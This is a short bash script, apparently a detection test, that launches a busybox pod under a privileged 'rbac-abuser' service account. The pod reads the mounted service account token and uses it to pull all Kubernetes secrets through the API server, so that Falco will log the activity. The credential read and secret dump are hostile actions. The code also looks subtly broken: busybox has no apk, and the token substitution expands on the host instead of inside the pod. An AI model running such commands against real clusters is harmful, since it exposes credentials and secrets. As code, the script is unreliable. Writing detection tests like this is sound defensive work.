#!/bin/bash
echo "[*] Simulating RBAC API misuse with privileged service account..."

kubectl delete pod rbac-abuse-test --ignore-not-found

kubectl run rbac-abuse-test \
  --image=busybox \
  --restart=Never \
  --overrides='{
    "apiVersion": "v1",
    "spec": {
      "serviceAccountName": "rbac-abuser"
    }
  }' \
  --command -- sh -c \
  "apk add --no-cache curl && curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' \
  https://kubernetes.default.svc/api/v1/secrets"

echo "[*] Done. Check Falco logs for detections."